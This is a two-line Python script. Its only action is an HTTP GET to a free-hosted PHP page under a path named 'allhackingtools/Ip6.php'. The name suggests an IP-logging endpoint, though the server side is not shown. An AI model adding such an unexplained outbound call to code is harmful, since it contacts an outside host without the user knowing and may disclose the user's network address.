import requests

requests.get("http://flyzero.000webhostapp.com/project/allhackingtools/Ip6.php")
